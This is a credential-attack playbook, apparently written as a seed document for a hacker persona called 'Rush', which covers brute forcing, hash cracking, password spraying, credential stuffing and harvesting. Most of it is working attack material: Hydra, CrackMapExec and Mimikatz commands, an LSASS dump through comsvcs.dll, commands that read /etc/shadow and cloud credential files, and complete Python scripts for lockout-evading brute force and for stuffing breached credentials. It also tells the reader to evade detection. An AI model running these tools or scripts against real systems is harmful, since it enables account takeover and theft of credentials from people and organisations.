# GS-30: Credential Attacks — Online, Offline, Spray, Stuff, Harvest

**Classification**: Rush (Royal Guard — The Breacher)
**Seed ID**: GS-30
**Domain**: Credential Attacks / Password Security
**Source**: SANS SEC504 (Hacker Tools, Techniques, and Incident Handling), MITRE ATT&CK T1110

---

## 1. Credential Attack Taxonomy

```
┌─────────────────────────────────────────────────────────────┐
│                  CREDENTIAL ATTACK TYPES                     │
├──────────────────┬──────────────────────────────────────────┤
│ ONLINE           │ Hit the live service — brute force,      │
│                  │ dictionary, spray. Network-bound. Slow.  │
│                  │ Risk: lockout, detection.                │
├──────────────────┼──────────────────────────────────────────┤
│ OFFLINE          │ Crack captured hashes locally. GPU-bound.│
│                  │ Fast. No lockout risk. Need the hash.    │
├──────────────────┼──────────────────────────────────────────┤
│ SPRAY            │ One password against many accounts.      │
│                  │ Avoids per-account lockout. High success │
│                  │ against large organizations.             │
├──────────────────┼──────────────────────────────────────────┤
│ STUFFING         │ Use breached credential pairs. Login as  │
│                  │ real users with real passwords from other │
│                  │ sites. Terrifyingly effective.            │
├──────────────────┼──────────────────────────────────────────┤
│ HARVEST          │ Capture credentials in transit or at     │
│                  │ rest. Responder, MITM, keyloggers,       │
│                  │ memory dumping, file scraping.            │
└──────────────────┴──────────────────────────────────────────┘
```

---

## 2. Online Attacks — Hydra

THC-Hydra is the most versatile online brute-forcer. Supports 50+ protocols.

### Core Syntax

```bash
hydra [options] <target> <protocol>

# Key flags:
# -l user / -L users.txt       — Single user / user list
# -p pass / -P passes.txt      — Single password / password list
# -t threads                    — Parallel connections (default 16)
# -w wait                       — Timeout per connection
# -f                            — Stop after first valid pair
# -V                            — Verbose — show each attempt
# -o output.txt                 — Save results to file
# -e nsr                        — Try null(n), same-as-user(s), reversed(r)
```

### Protocol Examples

```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://10.10.10.100

# FTP
hydra -L users.txt -P passes.txt -t 8 ftp://10.10.10.100

# SMB
hydra -l administrator -P passes.txt -t 4 smb://10.10.10.100

# RDP
hydra -l administrator -P passes.txt -t 4 rdp://10.10.10.100

# MySQL
hydra -l root -P passes.txt mysql://10.10.10.100

# PostgreSQL
hydra -l postgres -P passes.txt postgres://10.10.10.100

# MSSQL
hydra -l sa -P passes.txt mssql://10.10.10.100

# SNMP (community strings)
hydra -P community_strings.txt 10.10.10.100 snmp

# HTTP Basic Auth
hydra -l admin -P passes.txt -f 10.10.10.100 http-get /admin/

# HTTP POST Form (the most complex — must define form parameters)
hydra -l admin -P passes.txt 10.10.10.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
#  path:POST_data:failure_string

# HTTPS POST Form
hydra -l admin -P passes.txt 10.10.10.100 https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: session=abc123"
#  F=failure_string  H=custom_header

# HTTP POST with CSRF token (need to capture and pass it)
# Hydra struggles with CSRF — use custom scripts or Burp Intruder instead

# WinRM (via HTTP)
hydra -l administrator -P passes.txt 10.10.10.100 http-get -m "/wsman" -s 5985

# VNC (no username needed)
hydra -P passes.txt vnc://10.10.10.100

# Telnet
hydra -l admin -P passes.txt telnet://10.10.10.100
```

### Hydra Performance Tuning

```bash
# Reduce threads for sensitive services (SSH/RDP have connection limits)
hydra -t 2 ...   # SSH — many servers limit concurrent auth attempts
hydra -t 1 ...   # RDP — extremely slow, one at a time

# Increase threads for web services
hydra -t 64 ...  # HTTP — can usually handle many concurrent requests

# Resume interrupted attacks
hydra -R  # Resumes last session from hydra.restore

# Wait between attempts (helps avoid detection)
hydra -W 3 ...  # 3 second wait between attempts per thread
```

---

## 3. Online Attacks — Medusa

Medusa is an alternative to Hydra — faster for some protocols, more stable under load.

```bash
# Core syntax
medusa -h <host> -u <user> -P <wordlist> -M <module>

# SSH
medusa -h 10.10.10.100 -u root -P rockyou.txt -M ssh -t 4

# FTP
medusa -h 10.10.10.100 -U users.txt -P passes.txt -M ftp -t 8

# SMB
medusa -h 10.10.10.100 -u administrator -P passes.txt -M smbnt -t 4

# HTTP (basic auth)
medusa -h 10.10.10.100 -u admin -P passes.txt -M http -m DIR:/admin -t 16

# MySQL
medusa -h 10.10.10.100 -u root -P passes.txt -M mysql

# Scan multiple hosts
medusa -H hosts.txt -u admin -P passes.txt -M ssh -t 2

# List available modules
medusa -d
```

---

## 4. Online Attacks — Custom Async Python Brute-Forcer

When Hydra and Medusa don't fit — custom protocols, complex auth flows, CSRF tokens, 2FA, rate limiting awareness.

```python
#!/usr/bin/env python3
"""
Rush's Async Credential Brute-Forcer
Handles: HTTP forms, custom headers, CSRF tokens, rate limiting, lockout awareness.
"""

import asyncio
import aiohttp
import time
import sys
import re
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class BruteConfig:
    target_url: str
    method: str = "POST"                    # GET or POST
    username_field: str = "username"
    password_field: str = "password"
    extra_data: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    csrf_url: Optional[str] = None          # URL to fetch CSRF token
    csrf_field: str = "csrf_token"           # Form field name for CSRF
    csrf_pattern: str = r'name="csrf_token"\s+value="([^"]+)"'  # Regex to extract CSRF
    failure_string: str = "Invalid"          # String present in FAILED logins
    success_string: Optional[str] = None     # String present in SUCCESSFUL logins
    lockout_string: Optional[str] = None     # String indicating account lockout
    max_concurrent: int = 20
    delay_per_request: float = 0.0           # Seconds between requests per worker
    lockout_threshold: int = 0               # 0 = no lockout awareness
    lockout_window: int = 0                  # Seconds to wait after threshold
    proxy: Optional[str] = None

@dataclass
class BruteResult:
    username: str
    password: str
    success: bool
    response_code: int = 0
    locked_out: bool = False

class AsyncBruteForcer:
    def __init__(self, config: BruteConfig):
        self.config = config
        self.found_creds = []
        self.attempts = 0
        self.start_time = 0
        self.lockout_counts = {}  # Per-user attempt counter
        self._stop = False

    async def get_csrf_token(self, session: aiohttp.ClientSession) -> Optional[str]:
        """Fetch a fresh CSRF token."""
        if not self.config.csrf_url:
            return None
        try:
            async with session.get(self.config.csrf_url, ssl=False) as resp:
                text = await resp.text()
                match = re.search(self.config.csrf_pattern, text)
                if match:
                    return match.group(1)
        except Exception:
            pass
        return None

    async def try_credential(self, session: aiohttp.ClientSession,
                              username: str, password: str,
                              semaphore: asyncio.Semaphore) -> BruteResult:
        """Attempt a single credential pair."""
        if self._stop:
            return BruteResult(username, password, False)

        async with semaphore:
            # Lockout awareness
            if self.config.lockout_threshold > 0:
                user_count = self.lockout_counts.get(username, 0)
                if user_count >= self.config.lockout_threshold:
                    # Wait for lockout window to pass
                    await asyncio.sleep(self.config.lockout_window)
                    self.lockout_counts[username] = 0

            # Rate limiting
            if self.config.delay_per_request > 0:
                await asyncio.sleep(self.config.delay_per_request)

            # Build request data
            data = {
                self.config.username_field: username,
                self.config.password_field: password,
                **self.config.extra_data
            }

            # Add CSRF token if configured
            csrf = await self.get_csrf_token(session)
            if csrf:
                data[self.config.csrf_field] = csrf

            try:
                if self.config.method.upper() == "POST":
                    async with session.post(
                        self.config.target_url,
                        data=data,
                        headers=self.config.headers,
                        ssl=False,
                        allow_redirects=True,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        body = await resp.text()
                        status = resp.status
                else:
                    params = data
                    async with session.get(
                        self.config.target_url,
                        params=params,
                        headers=self.config.headers,
                        ssl=False,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        body = await resp.text()
                        status = resp.status

                self.attempts += 1
                self.lockout_counts[username] = self.lockout_counts.get(username, 0) + 1

                # Check for lockout
                if self.config.lockout_string and self.config.lockout_string in body:
                    print(f"[!] LOCKOUT DETECTED for {username}")
                    return BruteResult(username, password, False, status, locked_out=True)

                # Check for success
                success = False
                if self.config.success_string:
                    success = self.config.success_string in body
                else:
                    success = self.config.failure_string not in body

                if success:
                    result = BruteResult(username, password, True, status)
                    self.found_creds.append(result)
                    print(f"\n[+] FOUND: {username}:{password} (HTTP {status})")
                    return result

                # Progress indicator
                if self.attempts % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    print(f"\r[*] Attempts: {self.attempts} | Rate: {rate:.1f}/s | "
                          f"Found: {len(self.found_creds)}", end="", flush=True)

                return BruteResult(username, password, False, status)

            except Exception as e:
                return BruteResult(username, password, False)

    async def run(self, usernames: list, passwords: list,
                   stop_on_first: bool = False) -> list:
        """Execute the brute force attack."""
        self.start_time = time.time()
        semaphore = asyncio.Semaphore(self.config.max_concurrent)

        connector = aiohttp.TCPConnector(limit=self.config.max_concurrent, ssl=False)
        proxy = self.config.proxy

        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for username in usernames:
                for password in passwords:
                    task = self.try_credential(session, username, password, semaphore)
                    tasks.append(task)

            results = await asyncio.gather(*tasks)

        elapsed = time.time() - self.start_time
        print(f"\n\n[*] Completed: {self.attempts} attempts in {elapsed:.1f}s "
              f"({self.attempts/elapsed:.1f}/s)")
        print(f"[*] Found {len(self.found_creds)} valid credential(s)")

        for cred in self.found_creds:
            print(f"    [+] {cred.username}:{cred.password}")

        return self.found_creds


# ============================================================
# USAGE EXAMPLES
# ============================================================

async def example_basic_form():
    """Basic HTTP form brute force."""
    config = BruteConfig(
        target_url="http://10.10.10.100/login",
        username_field="user",
        password_field="pass",
        failure_string="Invalid username or password",
        max_concurrent=30,
    )

    bruter = AsyncBruteForcer(config)

    with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
        passwords = [line.strip() for line in f.readlines()[:10000]]

    await bruter.run(["admin", "root", "administrator"], passwords)


async def example_with_csrf():
    """Brute force with CSRF token extraction."""
    config = BruteConfig(
        target_url="http://10.10.10.100/login",
        csrf_url="http://10.10.10.100/login",
        csrf_field="_token",
        csrf_pattern=r'name="_token"\s+value="([^"]+)"',
        failure_string="These credentials do not match",
        max_concurrent=5,  # Lower — each request needs a fresh CSRF token
        delay_per_request=0.2,
    )

    bruter = AsyncBruteForcer(config)
    passwords = ["admin", "password", "123456", "letmein", "welcome"]
    await bruter.run(["admin"], passwords)


async def example_lockout_aware():
    """Brute force with lockout awareness (spray-like behavior)."""
    config = BruteConfig(
        target_url="http://10.10.10.100/api/login",
        method="POST",
        headers={"Content-Type": "application/json"},
        failure_string="unauthorized",
        lockout_threshold=3,   # Max 3 attempts per account
        lockout_window=300,    # Wait 5 minutes between batches
        max_concurrent=10,
    )

    bruter = AsyncBruteForcer(config)
    users = ["jsmith", "jdoe", "admin", "svc_backup"]
    passwords = ["Summer2026!", "Password1", "Welcome1"]
    await bruter.run(users, passwords)


if __name__ == "__main__":
    asyncio.run(example_basic_form())
```

---

## 5. Offline Attacks — Hashcat

Hashcat is the king of GPU-accelerated hash cracking. Every hash type, every attack mode.

### Key Hashcat Modes

| Mode | Hash Type | Example |
|---|---|---|
| **0** | MD5 | `5d41402abc4b2a76b9719d911017c592` |
| **100** | SHA1 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` |
| **1000** | NTLM | `31d6cfe0d16ae931b73c59d7e0c089c0` |
| **1400** | SHA256 | `2cf24dba5fb0a30e26e83b2ac5b9e29e...` |
| **1700** | SHA512 | `ba3253876aec6f8990e6cfe5174839414...` |
| **1800** | sha512crypt ($6$) | `$6$rounds=5000$salt$hash...` |
| **3200** | bcrypt | `$2b$12$salt...hash...` |
| **5600** | NetNTLMv2 | `user::DOMAIN:challenge:response:blob` |
| **7500** | Kerberos 5 AS-REQ Pre-Auth etype 23 | `$krb5pa$23$user$realm$hash` |
| **13100** | Kerberos 5 TGS-REP etype 23 (Kerberoast) | `$krb5tgs$23$*user$realm$spn*$hash` |
| **16500** | JWT (HS256) | `eyJ...` |
| **18200** | Kerberos 5 AS-REP etype 23 (AS-REP Roast) | `$krb5asrep$23$user@realm:hash` |
| **22000** | WPA-PBKDF2 (hccapx/22000) | PMKID/EAPOL |
| **500** | md5crypt ($1$) | `$1$salt$hash` |
| **1500** | DES crypt | `rEK1ecacw.7.c` |
| **2100** | MS DCC2 (mscash2) | `$DCC2$10240#user#hash` |
| **2500** | WPA/WPA2 (legacy) | hccap file |
| **5500** | NetNTLMv1 | `user::DOMAIN:response:response:challenge` |

### Attack Modes

```bash
# Mode 0: Dictionary attack
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Mode 1: Combination (word1 + word2)
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Mode 3: Brute-force / mask attack
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?d    # Ullllddd (e.g., Pass123)
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a          # All chars, 6 length

# Mode 6: Dictionary + mask (hybrid)
hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d  # word + 4 digits

# Mode 7: Mask + dictionary (hybrid reverse)
hashcat -m 1000 -a 7 hashes.txt ?d?d?d?d wordlist.txt  # 4 digits + word
```

### Mask Character Sets

| Placeholder | Character Set |
|---|---|
| `?l` | abcdefghijklmnopqrstuvwxyz |
| `?u` | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| `?d` | 0123456789 |
| `?s` | Special characters (space, !, @, #, etc.) |
| `?a` | All of the above combined |
| `?b` | All bytes (0x00-0xFF) |
| `?1` | Custom charset 1 (defined with -1) |

### Rules — The Real Power of Hashcat

```bash
# Apply rules to modify each word in the dictionary
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Chain multiple rule files
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules1.rule -r rules2.rule

# Common rule operations:
# l          — lowercase all
# u          — uppercase all
# c          — capitalize first letter
# t          — toggle case of all
# $1         — append "1"
# ^1         — prepend "1"
# sa@        — substitute a with @
# se3        — substitute e with 3
# d          — duplicate word (passwordpassword)
# r          — reverse word
```

### Custom Rules for Corporate Passwords

```bash
# Create a rule file: corporate.rule
# Targets patterns like: Season+Year!, Company+123, Name+2026!

# Content of corporate.rule:
c                           # Capitalize first
c $!                        # Capitalize + !
c $1                        # Capitalize + 1
c $1 $2 $3                  # Capitalize + 123
c $2 $0 $2 $6              # Capitalize + 2026
c $2 $0 $2 $6 $!           # Capitalize + 2026!
c $! $!                     # Capitalize + !!
c sa@ se3 si! so0           # Leet speak
c $# $1                     # Capitalize + #1
$@ $1 $2 $3                 # Append @123

# Use it:
hashcat -m 1000 -a 0 hashes.txt company_words.txt -r corporate.rule
```

### Performance Tips

```bash
# Show hashcat speed for a hash type
hashcat -m 1000 -b  # Benchmark NTLM

# Use specific GPU devices
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -d 1  # GPU 1 only

# Workload profile (1=low, 2=default, 3=high, 4=insane — may freeze desktop)
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a -w 3

# Save/restore sessions
hashcat -m 1000 -a 0 hashes.txt wordlist.txt --session=corporate
# Resume: hashcat --session=corporate --restore

# Show cracked hashes
hashcat -m 1000 hashes.txt --show

# Potfile — hashcat remembers every cracked hash
# Location: ~/.hashcat/hashcat.potfile
```

---

## 6. Offline Attacks — John the Ripper

```bash
# Basic usage
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify hash format
john --format=NT --wordlist=rockyou.txt hashes.txt          # NTLM
john --format=Raw-SHA256 --wordlist=rockyou.txt hashes.txt  # SHA256
john --format=bcrypt --wordlist=rockyou.txt hashes.txt      # bcrypt

# Incremental (brute force)
john --incremental hashes.txt
john --incremental=Digits hashes.txt  # Numbers only

# With rules
john --wordlist=rockyou.txt --rules=All hashes.txt
john --wordlist=rockyou.txt --rules=Jumbo hashes.txt

# Show cracked
john --show hashes.txt

# Crack Linux shadow file
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt

# Crack ZIP/RAR/Office
zip2john protected.zip > zip_hash.txt
rar2john protected.rar > rar_hash.txt
office2john protected.docx > office_hash.txt
john --wordlist=rockyou.txt zip_hash.txt

# Crack SSH keys
ssh2john id_rsa > ssh_hash.txt
john --wordlist=rockyou.txt ssh_hash.txt

# Crack Keepass databases
keepass2john database.kdbx > keepass_hash.txt
john --wordlist=rockyou.txt keepass_hash.txt
```

---

## 7. Password Spraying

One password against many accounts. Designed to stay under lockout thresholds.

### Spray Strategy

```
Lockout policy example:
- Threshold: 5 bad attempts
- Observation window: 30 minutes
- Lockout duration: 30 minutes

Spray approach:
- Try 2-3 passwords per window (stay well under threshold)
- Wait the full observation window between rounds
- Use the MOST LIKELY passwords first (season+year, company+123)
```

### Spray Against AD with CrackMapExec

```bash
# Single password against all users
crackmapexec smb 10.10.10.1 -u users.txt -p 'Summer2026!' --continue-on-success

# Multiple passwords (one per spray round)
crackmapexec smb 10.10.10.1 -u users.txt -p 'Summer2026!' 'Welcome1' 'Password1' --continue-on-success --no-bruteforce

# Note: --no-bruteforce means try each password against ALL users before moving to next password
# This is spray behavior (not brute force which tries all passwords per user)

# Spray against SMB
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Company2026!' --continue-on-success

# Spray against WinRM
crackmapexec winrm 10.10.10.0/24 -u users.txt -p 'Summer2026!' --continue-on-success

# Spray against LDAP
crackmapexec ldap 10.10.10.1 -u users.txt -p 'Welcome1!' --continue-on-success

# Spray against MSSQL
crackmapexec mssql 10.10.10.0/24 -u users.txt -p 'sa' --continue-on-success
```

### Spray Against O365 / Azure AD

```bash
# Using MSOLSpray
python3 MSOLSpray.py --userlist users.txt --password 'Summer2026!' --url https://login.microsoftonline.com

# Using Ruler (Exchange)
ruler --domain company.com brute --users users.txt --passwords spray_list.txt --delay 300

# Using SprayingToolkit
python3 atomizer.py owa target.company.com 'Summer2026!' users.txt --interval 300
```

### Top Spray Passwords (Statistically Effective)

```
Season+Year:    Spring2026!, Summer2026!, Fall2026!, Winter2026!
Company+Num:    Company123!, Company2026!, Company1!
Common:         Welcome1!, Password1!, P@ssw0rd!, Passw0rd!
Pattern:        Qwerty123!, Monday1!, January2026!
Default:        Changeme!, Changeme1!, Welcome!
```

---

## 8. Credential Stuffing

Using breached username:password pairs from other sites.

### Sources of Breached Credentials

```
- Public breach compilations (Collection #1-5, COMB, etc.)
- HaveIBeenPwned API (checking if accounts are in breaches)
- Telegram channels, dark web markets
- Site-specific dumps (LinkedIn, Adobe, Dropbox, etc.)

# HaveIBeenPwned API check
curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/user@company.com" \
  -H "hibp-api-key: YOUR_KEY" | python3 -m json.tool
```

### Stuffing Automation

```python
#!/usr/bin/env python3
"""Credential stuffing with breach data."""

import asyncio
import aiohttp
from typing import Tuple

async def try_login(session: aiohttp.ClientSession, url: str,
                     cred: Tuple[str, str], semaphore: asyncio.Semaphore,
                     failure_indicator: str) -> dict:
    """Try a breached credential pair."""
    email, password = cred
    async with semaphore:
        try:
            data = {"email": email, "password": password}
            async with session.post(url, json=data, ssl=False,
                                     timeout=aiohttp.ClientTimeout(total=10)) as resp:
                body = await resp.text()
                success = failure_indicator not in body and resp.status in (200, 302)
                if success:
                    print(f"[+] VALID: {email}:{password}")
                return {"email": email, "password": password, "success": success}
        except Exception:
            return {"email": email, "password": password, "success": False}

async def stuff_credentials(url: str, creds_file: str,
                              failure_indicator: str = "invalid",
                              concurrency: int = 30):
    """Load breached creds and test against target."""
    # Load credential pairs (email:password format)
    creds = []
    with open(creds_file, 'r', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                creds.append((parts[0], parts[1]))

    print(f"[*] Loaded {len(creds)} credential pairs")
    print(f"[*] Target: {url}")

    semaphore = asyncio.Semaphore(concurrency)
    valid = []

    async with aiohttp.ClientSession() as session:
        tasks = [try_login(session, url, c, semaphore, failure_indicator) for c in creds]
        results = await asyncio.gather(*tasks)
        valid = [r for r in results if r["success"]]

    print(f"\n[*] Results: {len(valid)}/{len(creds)} valid")
    for v in valid:
        print(f"    {v['email']}:{v['password']}")

    return valid

# asyncio.run(stuff_credentials("https://target.com/api/login", "breach_creds.txt"))
```

---

## 9. Credential Harvesting

### Responder — LLMNR/NBT-NS/MDNS Poisoning

```bash
# Responder captures NTLMv2 hashes by poisoning name resolution
sudo responder -I eth0 -rdwv

# Key flags:
# -I interface       — Network interface
# -r                 — Enable answers for NetBIOS wredir queries
# -d                 — Enable answers for NetBIOS domain queries
# -w                 — Start the WPAD rogue proxy server
# -v                 — Verbose output

# Hashes are saved to /usr/share/responder/logs/
# Format: NTLMv2-SSP-<IP>.txt

# Crack captured NTLMv2 hashes
hashcat -m 5600 -a 0 responder_hashes.txt rockyou.txt
```

### mitmproxy — HTTPS Interception

```bash
# Start mitmproxy in transparent mode
mitmproxy --mode transparent --ssl-insecure

# Or dump mode for non-interactive capture
mitmdump --mode transparent -w traffic.mitm

# Filter for credentials in captured traffic
mitmdump -r traffic.mitm --set flow_detail=3 -s "
from mitmproxy import http
def response(flow: http.HTTPFlow):
    if flow.request.method == 'POST':
        body = flow.request.get_text()
        if any(w in body.lower() for w in ['password', 'passwd', 'pass', 'token', 'secret']):
            print(f'[CRED] {flow.request.url}')
            print(f'       {body[:500]}')
"
```

### LaZagne — Local Credential Harvesting

```bash
# LaZagne extracts passwords stored locally on a compromised machine
# Supports: browsers, WiFi, mail clients, databases, sysadmin tools, etc.

# Windows (run as admin for full results)
lazagne.exe all                    # All modules
lazagne.exe browsers               # Browser passwords only
lazagne.exe wifi                   # WiFi passwords
lazagne.exe all -oJ               # JSON output
lazagne.exe all -oA -output C:\temp  # All formats to C:\temp

# Linux
python3 lazagne.py all
python3 lazagne.py browsers

# What LaZagne finds:
# - Chrome/Firefox/Edge saved passwords
# - WiFi passwords (netsh wlan show profile + key=clear)
# - Windows Credential Manager
# - PuTTY saved sessions
# - FileZilla saved FTP credentials
# - WinSCP stored passwords
# - Outlook/Thunderbird mail passwords
# - Database client passwords (DBeaver, HeidiSQL, etc.)
# - RDP saved connections
```

### Memory Credential Extraction

```bash
# Mimikatz — dump credentials from LSASS memory
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    # Passwords, hashes, tickets
mimikatz # sekurlsa::msv               # NTLM hashes
mimikatz # sekurlsa::kerberos          # Kerberos tickets
mimikatz # sekurlsa::wdigest           # WDigest plaintext (if enabled)
mimikatz # lsadump::sam                # Local SAM database
mimikatz # lsadump::dcsync /all        # DCSync — dump all domain hashes

# Remote LSASS dump (without Mimikatz on target)
# Method 1: procdump
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Method 2: Task Manager → Details → lsass.exe → Create dump file

# Method 3: comsvcs.dll (LOLBin — no tools needed)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Analyze dump offline with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Or with pypykatz (Python — works on Linux)
pypykatz lsa minidump lsass.dmp
```

### File-Based Credential Harvesting

```bash
# Windows — common credential locations
type C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data  # SQLite DB
type C:\Users\*\.ssh\id_rsa
type C:\Users\*\.aws\credentials
type C:\Users\*\.azure\accessTokens.json
dir /s /b C:\Users\*.kdbx              # Keepass databases
dir /s /b C:\Users\*password*          # Files with "password" in name
dir /s /b C:\Users\*credential*
dir /s /b C:\inetpub\web.config        # IIS connection strings
type C:\Windows\Panther\Unattend.xml   # Unattended install passwords

# Linux — common credential locations
cat /etc/shadow
cat ~/.ssh/id_rsa
cat ~/.aws/credentials
cat ~/.bash_history | grep -i 'pass\|token\|key\|secret'
find / -name "*.kdbx" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null   # WordPress DB creds
find / -name ".env" 2>/dev/null             # Environment files
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

---

## 10. Wordlist Generation and Curation

### CeWL — Custom Wordlist from Website

```bash
# Crawl a website and generate a wordlist from page content
cewl -d 3 -m 5 -w wordlist.txt https://target.com
# -d depth, -m minimum word length, -w output file

# Include email addresses
cewl -d 3 -m 5 -w wordlist.txt -e --email_file emails.txt https://target.com
```

### Username Generation

```bash
# From names list, generate common username formats
# John Smith → jsmith, john.smith, smithj, j.smith, john_smith, johns
# Use username-anarchy:
./username-anarchy --input-file names.txt --select-format first.last,flast,firstl > users.txt
```

### Custom Wordlist from OSINT

```python
#!/usr/bin/env python3
"""Generate targeted wordlist from OSINT data."""

def generate_targeted_wordlist(company: str, year: int = 2026, extras: list = None) -> list:
    """Generate likely passwords based on company info."""
    words = [company, company.lower(), company.upper(), company.capitalize()]

    if extras:
        words.extend(extras)

    passwords = set()
    separators = ["", "!", "@", "#", "1", "123", "!", "@123"]
    years = [str(year), str(year-1), str(year)[-2:], str(year-1)[-2:]]
    seasons = ["Spring", "Summer", "Fall", "Winter", "spring", "summer", "fall", "winter"]

    for word in words:
        for sep in separators:
            passwords.add(f"{word}{sep}")
            for y in years:
                passwords.add(f"{word}{y}{sep}")
                passwords.add(f"{word}{sep}{y}")
        for season in seasons:
            for y in years:
                passwords.add(f"{season}{y}!")
                passwords.add(f"{season}{y}")

    # Leet speak variants
    leet = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "$"}
    for word in list(words)[:3]:
        leetword = word
        for char, replacement in leet.items():
            leetword = leetword.replace(char, replacement)
        passwords.add(leetword)
        passwords.add(f"{leetword}!")
        passwords.add(f"{leetword}123")

    return sorted(passwords)

# Usage
wordlist = generate_targeted_wordlist(
    "StoneAI",
    year=2026,
    extras=["palace", "founder", "breach"]
)
for pw in wordlist:
    print(pw)
```

---

## 11. Rush's Tactical Notes

1. **Always spray before brute.** Spray is stealthier, faster to find the one weak account in a thousand. Three good spray passwords against 500 accounts beats 10,000 passwords against one account.

2. **Know your hashcat modes.** 1000=NTLM, 5600=NetNTLMv2, 13100=Kerberoast, 18200=AS-REP, 16500=JWT. Memorize these five — they cover 80% of pentest cracking.

3. **Rules multiply your wordlist.** rockyou.txt with best64.rule tests ~480 million variations. OneRuleToRuleThemAll tests billions. Always use rules.

4. **Responder runs first on every internal pentest.** Start it, walk away. By the time you've finished reconnaissance, you'll have NTLMv2 hashes waiting. Passive collection, zero risk.

5. **LaZagne after every shell.** First thing on a compromised box: run LaZagne. Browser passwords, WiFi keys, saved sessions — all gold for lateral movement.

6. **Never solve only the problem in front of you.** One cracked password reveals the user's pattern. If they use `Summer2026!` here, they use `Summer2026!` everywhere. One hash tells you the password policy. One Responder capture tells you LLMNR is enabled network-wide. Think every version of the problem.

---

*Rush doesn't guess passwords. Rush makes passwords irrelevant.*
